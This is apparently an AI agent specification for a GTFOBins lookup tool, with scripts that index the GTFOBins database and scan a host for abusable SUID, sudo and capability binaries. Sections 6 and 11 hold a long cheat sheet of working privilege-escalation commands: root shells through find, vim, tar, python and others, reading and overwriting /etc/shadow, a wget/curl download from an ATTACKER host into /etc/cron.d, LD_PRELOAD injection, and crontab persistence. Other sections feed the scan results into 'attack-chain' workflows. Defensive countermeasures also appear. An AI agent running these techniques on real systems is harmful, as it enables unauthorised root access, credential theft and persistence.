# GTFOBins Lookup Agent

Quick reference lookup for GTFOBins — the curated list of Unix binaries that can be abused to bypass local security restrictions (SUID abuse, sudo escape, shell escape, file read/write, library load, network egress). Ships with a bundled offline copy so lookups work without internet.

## Safety Rules

- Defensive / educational lookups only — this agent does not execute exploit payloads
- NEVER run an exploit technique on a system without explicit authorization
- Do not modify SUID bits, sudoers, or capabilities during enumeration
- Scan commands are read-only (`find`, `stat`, `getcap`, `sudo -l`)
- All auto-scans must be logged to `/var/log/claudeos/gtfobins-lookup.log`
- When chaining with privilege-escalator or attack-chain, verify engagement scope first

---

## 1. Install / Bootstrap

### Directories and dependencies

```bash
# One-time setup
sudo mkdir -p /var/lib/claudeos/gtfobins /var/log/claudeos
sudo chmod 0755 /var/lib/claudeos/gtfobins
sudo touch /var/log/claudeos/gtfobins-lookup.log
sudo chmod 0640 /var/log/claudeos/gtfobins-lookup.log

# Required tools
which jq || sudo apt-get install -y jq
which git || sudo apt-get install -y git
which yq || sudo snap install yq || pip install yq
```

### Sync the offline GTFOBins database

```bash
# Pull upstream (only needs internet once)
GTFO_DIR=/var/lib/claudeos/gtfobins
if [ ! -d "$GTFO_DIR/_gtfobins" ]; then
  sudo git clone --depth=1 https://github.com/GTFOBins/GTFOBins.github.io.git "$GTFO_DIR/_gtfobins"
else
  sudo git -C "$GTFO_DIR/_gtfobins" pull --ff-only
fi

# Index binaries directory — each file is a YAML describing abuse functions
ls "$GTFO_DIR/_gtfobins/_gtfobins/" | sed 's/\.md$//' | sort -u | sudo tee "$GTFO_DIR/index.txt" >/dev/null
wc -l "$GTFO_DIR/index.txt"
```

### Build a JSON index for fast lookup

```bash
GTFO_DIR=/var/lib/claudeos/gtfobins
python3 - <<'PY'
import os, re, json, yaml, pathlib
root = pathlib.Path("/var/lib/claudeos/gtfobins/_gtfobins/_gtfobins")
out = {}
for md in sorted(root.glob("*.md")):
    name = md.stem
    text = md.read_text(encoding="utf-8", errors="ignore")
    m = re.search(r"^---\s*\n(.*?)\n---", text, re.DOTALL | re.MULTILINE)
    if not m:
        continue
    try:
        data = yaml.safe_load(m.group(1)) or {}
    except Exception:
        continue
    funcs = data.get("functions", {}) or {}
    out[name] = {k: [e.get("code","").strip() for e in v] for k,v in funcs.items()}
pathlib.Path("/var/lib/claudeos/gtfobins/index.json").write_text(json.dumps(out, indent=2))
print(f"Indexed {len(out)} binaries -> /var/lib/claudeos/gtfobins/index.json")
PY
```

---

## 2. Lookup a Single Binary

### `claudeos gtfobins lookup <binary>`

```bash
gtfobins_lookup() {
  local bin="$1"
  local idx=/var/lib/claudeos/gtfobins/index.json
  [ -z "$bin" ] && { echo "Usage: gtfobins_lookup <binary>"; return 1; }
  [ ! -f "$idx" ] && { echo "[!] index missing — run bootstrap first"; return 1; }

  jq -e --arg b "$bin" 'has($b)' "$idx" >/dev/null || {
    echo "[-] $bin is NOT in GTFOBins"
    return 2
  }

  echo "==============================================="
  echo "  GTFOBins techniques for: $bin"
  echo "==============================================="
  jq -r --arg b "$bin" '.[$b] | to_entries[] | "\n### \(.key)\n" + (.value | map("  $ " + .) | join("\n\n"))' "$idx"
  echo
  echo "Upstream: https://gtfobins.github.io/gtfobins/$bin/"
  echo "Local: /var/lib/claudeos/gtfobins/_gtfobins/_gtfobins/${bin}.md"
  echo "$(date -Is) lookup $bin" | sudo tee -a /var/log/claudeos/gtfobins-lookup.log >/dev/null
}

# Usage
gtfobins_lookup find
gtfobins_lookup vim
gtfobins_lookup nmap
```

### Filter by abuse function

```bash
# Only show SUID abuse for a binary
gtfobins_suid() {
  jq -r --arg b "$1" '.[$b]."suid" // "no-suid-technique" | if type=="array" then map("  $ "+.) | join("\n\n") else . end' \
    /var/lib/claudeos/gtfobins/index.json
}

# Only show sudo abuse
gtfobins_sudo() {
  jq -r --arg b "$1" '.[$b]."sudo" // "no-sudo-technique" | if type=="array" then map("  $ "+.) | join("\n\n") else . end' \
    /var/lib/claudeos/gtfobins/index.json
}

# Shell escape, file read, file write, library load, capabilities, etc.
gtfobins_func() {
  local bin="$1" func="$2"
  jq -r --arg b "$bin" --arg f "$func" '.[$b][$f] // "not-available"' /var/lib/claudeos/gtfobins/index.json
}

gtfobins_func vim shell
gtfobins_func python file-read
gtfobins_func perl capabilities
```

---

## 3. Auto-Scan the Live System

### Scan SUID / SGID binaries and flag GTFOBins hits

```bash
gtfobins_scan_suid() {
  local idx=/var/lib/claudeos/gtfobins/index.json
  local report=/tmp/gtfobins-suid-$(date +%s).txt

  echo "[*] Scanning SUID/SGID files..." | tee "$report"
  find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -print 2>/dev/null | while read -r f; do
    name=$(basename "$f")
    if jq -e --arg b "$name" 'has($b)' "$idx" >/dev/null 2>&1; then
      funcs=$(jq -r --arg b "$name" '.[$b] | keys | join(",")' "$idx")
      echo "[!] $f  ->  GTFOBins funcs: $funcs" | tee -a "$report"
    fi
  done
  echo "[*] Report saved: $report"
  echo "$(date -Is) scan-suid report=$report" | sudo tee -a /var/log/claudeos/gtfobins-lookup.log >/dev/null
}

gtfobins_scan_suid
```

### Scan sudoers (`sudo -l`) for GTFOBins-abusable binaries

```bash
gtfobins_scan_sudo() {
  local idx=/var/lib/claudeos/gtfobins/index.json
  echo "[*] Checking sudo -l ..."
  sudo -n -l 2>/dev/null | grep -E '^\s*\(' | while read -r line; do
    # Extract binary path from "(ALL) NOPASSWD: /usr/bin/less"
    bin=$(echo "$line" | awk '{print $NF}' | xargs -I{} basename {})
    if jq -e --arg b "$bin" 'has($b)' "$idx" >/dev/null 2>&1; then
      funcs=$(jq -r --arg b "$bin" '.[$b] | keys | join(",")' "$idx")
      echo "[!] sudo rule allows $bin  ->  abuse via: $funcs"
    fi
  done
}
```

### Scan file capabilities (`getcap -r`)

```bash
gtfobins_scan_caps() {
  local idx=/var/lib/claudeos/gtfobins/index.json
  echo "[*] Scanning Linux file capabilities..."
  getcap -r / 2>/dev/null | while read -r line; do
    path=$(echo "$line" | awk '{print $1}')
    name=$(basename "$path")
    if jq -e --arg b "$name" '.[$b] | has("capabilities")' "$idx" >/dev/null 2>&1; then
      echo "[!] $line"
      jq -r --arg b "$name" '.[$b]."capabilities" | map("    $ "+.) | join("\n")' "$idx"
    fi
  done
}
```

### Walk writable PATH dirs (`/usr/bin`, `/usr/local/bin`) and report known GTFOBins

```bash
gtfobins_scan_path() {
  local idx=/var/lib/claudeos/gtfobins/index.json
  for dir in /usr/bin /usr/local/bin /bin /sbin /usr/sbin; do
    [ -d "$dir" ] || continue
    for f in "$dir"/*; do
      [ -x "$f" ] || continue
      name=$(basename "$f")
      if jq -e --arg b "$name" 'has($b)' "$idx" >/dev/null 2>&1; then
        funcs=$(jq -r --arg b "$name" '.[$b] | keys | join(",")' "$idx")
        echo "$f  -> $funcs"
      fi
    done
  done
}
```

---

## 4. Unified CLI Wrapper

Install to `/usr/local/bin/gtfobins` so users can just run `gtfobins find`:

```bash
sudo tee /usr/local/bin/gtfobins >/dev/null <<'BASH'
#!/usr/bin/env bash
set -euo pipefail
IDX=/var/lib/claudeos/gtfobins/index.json
LOG=/var/log/claudeos/gtfobins-lookup.log
[ ! -f "$IDX" ] && { echo "Run: sudo claudeos gtfobins bootstrap"; exit 1; }

cmd="${1:-}"; shift || true
log() { echo "$(date -Is) $*" | sudo tee -a "$LOG" >/dev/null; }

case "$cmd" in
  lookup|find|"")
    bin="${1:-}"
    [ -z "$bin" ] && { echo "Usage: gtfobins lookup <binary>"; exit 1; }
    jq -e --arg b "$bin" 'has($b)' "$IDX" >/dev/null || { echo "[-] $bin not in GTFOBins"; exit 2; }
    echo "=== $bin ==="
    jq -r --arg b "$bin" '.[$b] | to_entries[] | "\n# \(.key)\n" + (.value | map("  $ "+.) | join("\n\n"))' "$IDX"
    log "lookup $bin"
    ;;
  list)
    jq -r 'keys[]' "$IDX" | column
    ;;
  func)
    bin="$1"; func="$2"
    jq -r --arg b "$bin" --arg f "$func" '.[$b][$f] // "not-available" | if type=="array" then map("  $ "+.) | join("\n\n") else . end' "$IDX"
    ;;
  scan-suid)
    find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -print 2>/dev/null | while read -r f; do
      name=$(basename "$f")
      if jq -e --arg b "$name" 'has($b)' "$IDX" >/dev/null 2>&1; then
        funcs=$(jq -r --arg b "$name" '.[$b] | keys | join(",")' "$IDX")
        echo "[!] $f  ->  $funcs"
      fi
    done
    log "scan-suid"
    ;;
  scan-sudo)
    sudo -n -l 2>/dev/null | grep -E '/(usr/)?bin/' | awk '{for(i=1;i<=NF;i++) if($i ~ /^\//) print $i}' | while read -r p; do
      name=$(basename "$p")
      if jq -e --arg b "$name" 'has($b)' "$IDX" >/dev/null 2>&1; then
        funcs=$(jq -r --arg b "$name" '.[$b] | keys | join(",")' "$IDX")
        echo "[!] sudo $p -> $funcs"
      fi
    done
    log "scan-sudo"
    ;;
  scan-caps)
    getcap -r / 2>/dev/null | while read -r line; do
      name=$(basename "$(echo "$line" | awk '{print $1}')")
      jq -e --arg b "$name" '.[$b] | has("capabilities")' "$IDX" >/dev/null 2>&1 && echo "[!] $line"
    done
    log "scan-caps"
    ;;
  scan-all)
    echo "### SUID ###"; "$0" scan-suid
    echo "### SUDO ###"; "$0" scan-sudo
    echo "### CAPS ###"; "$0" scan-caps
    ;;
  bootstrap)
    sudo mkdir -p /var/lib/claudeos/gtfobins
    cd /var/lib/claudeos/gtfobins
    [ -d _gtfobins ] || sudo git clone --depth=1 https://github.com/GTFOBins/GTFOBins.github.io.git _gtfobins
    sudo git -C _gtfobins pull --ff-only
    echo "Re-run the python index build block in the agent"
    ;;
  *)
    echo "Usage: gtfobins {lookup <bin>|list|func <bin> <func>|scan-suid|scan-sudo|scan-caps|scan-all|bootstrap}"
    exit 1
    ;;
esac
BASH
sudo chmod +x /usr/local/bin/gtfobins
```

---

## 5. Known Abuse Functions (Quick Reference)

| Function | Meaning |
|---|---|
| `shell` | Spawn an interactive shell from the binary |
| `command` | Run an arbitrary command |
| `reverse-shell` | Spawn a reverse shell |
| `non-interactive-reverse-shell` | Non-interactive reverse shell |
| `bind-shell` | Listen on a port and give a shell |
| `non-interactive-bind-shell` | Non-interactive bind shell |
| `file-upload` | Upload a file to a remote host |
| `file-download` | Download a file from a remote host |
| `file-write` | Write arbitrary content to a file |
| `file-read` | Read a file bypassing DAC |
| `library-load` | Load a shared library |
| `suid` | Abuse when the binary has the SUID bit |
| `sudo` | Abuse when the user can run this via sudo |
| `capabilities` | Abuse when the binary has Linux file capabilities (e.g. `cap_setuid+ep`) |
| `limited-suid` | Limited SUID techniques (no full root shell) |

---

## 6. Common High-Value Binaries (pre-cached cheatsheet)

These are the most frequently found on real systems — every ClaudeOS operator should know them cold.

```
find    vim     nano    less    more    man     awk     perl    python3
ruby    lua     node    php     bash    sh      env     tar     zip
unzip   nmap    socat   ncat    nc      wget    curl    gdb     expect
ftp     ssh     scp     rsync   cp      mv      dd      tee     tail
head    sed     git     gcc     make    systemctl  docker  sudo    ip
```

Use `gtfobins lookup <name>` on any of the above.

### Inline cheats (memorized — always work even without the index)

```bash
# find with SUID -> instant root
./find . -exec /bin/sh -p \; -quit

# sudo vim -> shell escape
sudo vim -c ':!/bin/sh'

# sudo less -> shell escape
sudo less /etc/hosts        # then type: !/bin/sh

# sudo awk -> shell
sudo awk 'BEGIN {system("/bin/sh")}'

# sudo python -> shell
sudo python3 -c 'import os; os.system("/bin/sh")'

# sudo perl -> shell
sudo perl -e 'exec "/bin/sh";'

# SUID nmap (legacy interactive mode, nmap < 5.21)
nmap --interactive
nmap> !sh

# tar with --checkpoint-action
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# env (sudo) -> shell
sudo env /bin/sh

# capabilities: python with cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

---

## 7. Integration with Other Agents

### Chain with `privilege-escalator`

```bash
# 1. privilege-escalator gathers suid/sudo/caps context
# 2. gtfobins-lookup enriches each candidate with working techniques
gtfobins scan-all > /tmp/gtfo-report.txt
/usr/local/bin/privilege-escalator --import /tmp/gtfo-report.txt
```

### Chain with `attack-chain`

```bash
# Feed hits straight into a multi-stage attack workflow
gtfobins scan-suid | grep '\[!\]' | awk '{print $2}' > /tmp/abusable.txt
# attack-chain consumes /tmp/abusable.txt as Stage-2 privesc candidates
```

### Report output for `report-writer`

```bash
gtfobins scan-all 2>&1 | tee /var/lib/claudeos/findings/$(date +%F)-gtfobins.txt
```

---

## 8. Update / Maintenance

```bash
# Weekly cron to refresh the bundled DB
sudo tee /etc/cron.weekly/gtfobins-sync >/dev/null <<'CRON'
#!/bin/sh
cd /var/lib/claudeos/gtfobins/_gtfobins && git pull --ff-only >/dev/null 2>&1
# Rebuild index
python3 /var/lib/claudeos/gtfobins/build_index.py >/dev/null 2>&1 || true
CRON
sudo chmod +x /etc/cron.weekly/gtfobins-sync
```

---

## 9. Troubleshooting

| Symptom | Fix |
|---|---|
| `jq: error: has(...) requires object` | Rebuild `index.json` — schema mismatch |
| `index missing` | Run `gtfobins bootstrap` |
| `sudo -l` returns nothing | Run as the target unprivileged user |
| `getcap: command not found` | `sudo apt-get install libcap2-bin` |
| Binary found but not in GTFOBins | Try `strings /usr/bin/foo | grep -i shell` and check `man` for `-e`, `!`, or `--eval` flags |

---

## 10. Exit Codes

- `0` — lookup succeeded / binary is in GTFOBins
- `1` — usage / bootstrap error
- `2` — binary is not a GTFOBin (safe)
- `3` — index corruption

---

## 11. Full Abuse Reference — Top 30 Binaries

Below is a defensive/educational reference of the most frequently encountered GTFOBins on Ubuntu/Debian. Keep this near the top of your playbook so you don't need to shell out to the index every time.

### find
```bash
# SUID  -> root shell
./find . -exec /bin/sh -p \; -quit
# sudo
sudo find . -exec /bin/sh \; -quit
# capabilities (cap_dac_read_search)
find . -exec cat /etc/shadow \; -quit
```

### vim / vi / view / rvim / vimdiff
```bash
# sudo -> shell
sudo vim -c ':!/bin/sh'
sudo vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
# file-read
sudo vim -c ':r /etc/shadow' -c ':wq /tmp/out'
```

### less / more / man / pg
```bash
sudo less /etc/profile
# then type:  !/bin/sh
sudo man man
# then type:  !/bin/sh
```

### awk / gawk / mawk
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
awk 'BEGIN {while ((getline line < "/etc/shadow") > 0) print line}'
```

### python / python2 / python3
```bash
sudo python3 -c 'import os;os.system("/bin/sh")'
sudo python3 -c 'import os;os.setuid(0);os.execl("/bin/sh","sh","-p")'
# capabilities cap_setuid
python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
# file-read
python3 -c 'print(open("/etc/shadow").read())'
```

### perl
```bash
sudo perl -e 'exec "/bin/sh";'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh -p";'
```

### ruby
```bash
sudo ruby -e 'exec "/bin/sh"'
ruby -e 'Process::UID.change_privilege(0); exec "/bin/sh"'
```

### php
```bash
sudo php -r "system('/bin/sh');"
CMD="/bin/sh" php -r 'pcntl_exec("/bin/sh",["-p"]);'
```

### node / nodejs
```bash
sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]});'
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh",{stdio:[0,1,2]});'
```

### lua
```bash
sudo lua -e 'os.execute("/bin/sh")'
```

### bash / sh
```bash
# sudo with SUDO_COMMAND=bash
sudo /bin/bash -p
# SUID bash (rare but possible)
/bin/bash -p
```

### nmap
```bash
# Interactive mode (legacy, nmap < 5.21)
nmap --interactive
nmap> !sh
# Script engine
echo 'os.execute("/bin/sh")' > /tmp/x.nse
sudo nmap --script=/tmp/x.nse
```

### tar
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo tar c a.tar --to-command '/bin/sh'
# file-read
tar cfvv /dev/null /etc/shadow
```

### zip / unzip
```bash
sudo zip /tmp/x.zip /etc/hosts -T -TT '/bin/sh #'
TF=$(mktemp -u); zip $TF /etc/hosts -T -TT 'sh #'; rm $TF
```

### git
```bash
sudo git help config
# then:  !/bin/sh
sudo PAGER='/bin/sh -c "exec /bin/sh 0<&1"' git -p help
# via hooks
sudo git -c core.pager='/bin/sh' help status
```

### gdb
```bash
sudo gdb -nx -ex '!sh' -ex quit
sudo gdb -nx -ex 'python import os; os.execl("/bin/sh","sh","-p")' -ex quit
```

### env
```bash
sudo env /bin/sh
sudo env LD_PRELOAD=/tmp/evil.so /bin/ls
```

### tee
```bash
# file-write (sudo)
echo 'malicious' | sudo tee /etc/cron.d/pwn
```

### dd
```bash
# file-write as root
LFILE=/etc/shadow; echo DATA | sudo dd of=$LFILE
# file-read
sudo dd if=/etc/shadow
```

### cp / mv
```bash
# Replace /etc/shadow
sudo cp /tmp/shadow /etc/shadow
sudo mv /tmp/shadow /etc/shadow
```

### install
```bash
TF=$(mktemp); sudo install -m 4755 /bin/bash $TF && $TF -p
```

### wget / curl
```bash
# file-write
sudo wget http://ATTACKER/payload -O /etc/cron.d/pwn
sudo curl http://ATTACKER/payload -o /etc/cron.d/pwn
# file-read (via --upload-file or --post-file)
sudo curl file:///etc/shadow
```

### rsync
```bash
sudo rsync -e 'sh -c "/bin/sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

### ssh
```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

### scp
```bash
scp -S /tmp/cmd.sh x y:
```

### ftp
```bash
sudo ftp
ftp> !/bin/sh
```

### ed
```bash
sudo ed
!/bin/sh
```

### sed
```bash
sudo sed -n '1e exec sh 1>&0' /etc/hosts
```

### expect
```bash
sudo expect -c 'spawn /bin/sh;interact'
```

### socat
```bash
sudo socat stdin exec:/bin/sh
```

### crontab
```bash
# If you can edit root crontab via sudo
sudo crontab -e
# then add: * * * * * /bin/sh -c 'cp /bin/bash /tmp/rb && chmod 4755 /tmp/rb'
```

### systemctl
```bash
TF=$(mktemp).service
cat > $TF <<EOF
[Service]
ExecStart=/bin/sh -c "id > /tmp/out"
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl link $TF
sudo systemctl enable --now $(basename $TF)
```

### docker
```bash
# Any user in the 'docker' group is effectively root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## 12. How Each Function Is Detected

The agent classifies a candidate binary with these heuristic checks before confirming against GTFOBins:

```bash
# Is it SUID?
[ -u /usr/bin/$BIN ] && echo "SUID set"

# Is it SGID?
[ -g /usr/bin/$BIN ] && echo "SGID set"

# Does it have file capabilities?
getcap /usr/bin/$BIN 2>/dev/null

# Is the user allowed to run it via sudo?
sudo -l 2>/dev/null | grep -w "$BIN"

# Is it in $PATH at all?
command -v $BIN

# Hash check — verify it isn't a trojaned replacement
sha256sum /usr/bin/$BIN
dpkg -S /usr/bin/$BIN 2>/dev/null | awk -F: '{print $1}' | xargs -I{} dpkg -V {} 2>/dev/null
```

---

## 13. Defensive Counter-Measures

For blue teams who read this agent: removing the SUID bit on abusable binaries is safe on most servers.

```bash
# Safe to demote SUID on most Ubuntu/Debian servers
for b in find vim less awk perl python3 ruby lua node php nmap tar zip; do
  p=$(command -v "$b" 2>/dev/null) || continue
  if [ -u "$p" ]; then
    echo "demoting SUID: $p"
    sudo chmod u-s "$p"
  fi
done

# Remove dangerous sudoers rules
sudo visudo -c
sudo grep -rE 'NOPASSWD.*/(find|vim|less|awk|perl|python|ruby|nmap|tar|zip)' /etc/sudoers /etc/sudoers.d/

# Drop dangerous file capabilities
getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_dac_read_search|cap_sys_admin'
sudo setcap -r /path/to/binary
```

---

## 14. References

- GTFOBins website: https://gtfobins.github.io/
- GTFOBins GitHub source: https://github.com/GTFOBins/GTFOBins.github.io
- linPEAS / LinEnum — auto-enumeration scripts that pair well with this agent
- `privilege-escalator` ClaudeOS agent — escalation workflow
- `config-hardener` ClaudeOS agent — apply the counter-measures above
- `lolbas-finder` ClaudeOS agent — cousin for post-exploitation binaries
